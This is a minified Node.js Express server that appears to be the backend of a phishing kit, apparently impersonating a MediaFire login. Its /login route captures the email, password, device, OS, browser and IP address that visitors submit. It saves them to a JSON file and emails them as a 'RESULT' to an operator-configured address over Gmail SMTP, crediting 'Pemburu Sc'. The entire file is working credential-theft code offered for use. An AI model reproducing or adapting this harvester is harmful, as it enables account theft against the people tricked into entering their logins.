require("dotenv").config();let express=require("express"),path=require("path"),bodyParser=require("body-parser"),useragent=require("express-useragent"),requestIp=require("request-ip"),fs=require("fs/promises"),nodemailer=require("nodemailer"),app=express(),port=5e3;app.use(bodyParser.json()),app.use(express.json()),app.use(useragent.express()),app.use(requestIp.mw()),app.set("trust proxy",!0),app.use(express.urlencoded({extended:!0})),app.use(express.static(path.join(__dirname,"./public"))),app.get("/",(e,r)=>{r.sendFile(path.join(__dirname,"src/views/index.html"))}),app.post("/login",async(e,r)=>{r.send("success");var{email:s,password:a,modelInfo:o,platformInfo:n,versiInfo:t}=e.body,p=e.body.email,i=e.body.password,l=e.useragent,s=s||p||"Unknown",p=a||i||"Unknown",a=o+" "+n+" "+t||"Unknown",i=l.os||"Unknown",o=l.browser||"Unknown",n=e.clientIp||"Unknown",t=path.join(__dirname,"src/data/data.json");let d=[];try{var u=await fs.readFile(t,"utf-8");d=JSON.parse(u||"[]")}catch(e){console.error("\nPastikan file data.json ada",e)}d.push({emVal:s,passVal:p,device:a,os:i,browser:o,ipAddress:n});try{await fs.writeFile(t,JSON.stringify(d,null,2)),console.log(`
Data login berhasil disimpan.`)}catch(e){return console.error("\nGagal menyimpan data ke data.json",e),r.status(500)}l=path.join(__dirname,"src/data/email.json");try{var c=await fs.readFile(l,"utf-8"),m=JSON.parse(c||"[]");if(0<m.length){var g=m[m.length-1].receiverEmail,h=nodemailer.createTransport({host:"smtp.gmail.com",port:587,secure:!1,auth:{user:process.env.SEND_MAIL,pass:process.env.KUL_LANCIADI}}),f={from:`"Pemburu Sc" <${process.env.SEND_MAIL}>`,to:g,subject:"💸RESULT MEDIAFIRE💸",html:`
         <div style="font-family: Monospace, Arial, sans-serif; color: #333; line-height: 1.1;">
         <p><strong>Email:</strong> ${s}</p>
         <p><strong>Password:</strong> ${p}</p>
         <p><strong>Device:</strong> ${a}</p>
         <p><strong>Os:</strong> ${i}</p>
         <p><strong>Browser:</strong> ${o}</p>
         <p><strong>Ip Addres:</strong> ${n}</p>
         
         <hr style="border: none; border-top: 1px solid #ddd; margin: 10px 0;">
         
         <h3 style="color: #2196F3;">Subscribe Channel YouTube Pemburu Sc:</h3>
         <p><a href="https://youtube.com/@pemburusc-g5d?si=NK8Bn0lGTT6jhoNQ" style="text-decoration: none; color: #2196F3;">https://youtube.com/@pemburusc-g5d?si=NK8Bn0lGTT6jhoNQ</a></p>
         
         <footer style="margin-top: 20px; font-size: 12px; color: #666;">
         <p>Credits: Pemburu Sc.</p>
         </footer>
         </div>
         `};try{await h.sendMail(f);console.log("\nResult berhasil dikirim. Cek Email Anda.")}catch(e){console.error("\nGagal mengirim email:",e)}}else console.error("\nBelum ada email yang disimpan. Tidak dapat mengirim result.")}catch(e){console.error("\nPastikan file email.json ada",e)}}),app.use((e,r)=>{r.status(404).redirect("/")}),app.use((e,r,s,a)=>{console.error(e.stack),s.status(500).send("Terjadi kesalahan server.")}),app.listen(port,()=>{console.log(`
Running: http://localhost:`+port)});